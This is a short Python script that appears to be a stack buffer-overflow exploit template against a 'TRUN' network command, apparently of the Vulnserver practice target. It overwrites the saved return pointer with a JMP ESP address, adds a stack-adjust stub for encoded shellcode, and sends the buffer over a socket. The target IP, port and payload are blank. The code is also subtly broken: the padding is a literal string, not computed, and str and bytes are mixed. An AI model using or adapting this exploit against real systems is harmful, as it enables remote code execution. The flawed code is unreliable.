#!/usr/bin/python

import sys,socket,struct

IP=""
port=1

buf_totlen = 1024 #Keep total length constant
offset_SRP = 146

ptr_JMP_ESP = 0x080414C3
sub_esp_10 = b"\x83\xec\x10" #Used to mitigate shikata_ga_nai's GETPC routine. Needed when payload is encoded. Also, watch out for badchars

payload = b""

padding = "\x90" * 32

shellcode = b""
shellcode += b"('A' * (offset_SRP - len(shellcode)"  #padding
shellcode += struct.pack("<I", ptr_JMP_ESP)       # SRP overwrite
shellcode += sub_esp_10                           # ESP points here 
shellcode += payload
shellcode += b"D" * (buf_totlen - len(shellcode)) #trailing padding to keep payload constant
#shellcode += b"'\n'"

try:
                            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.connect((IP,port))
                            s.send (('TRUN /.:/' + shellcode))
                            s.close()
              
except:
                            print ("Error connecting to server")
                            sys.exit()
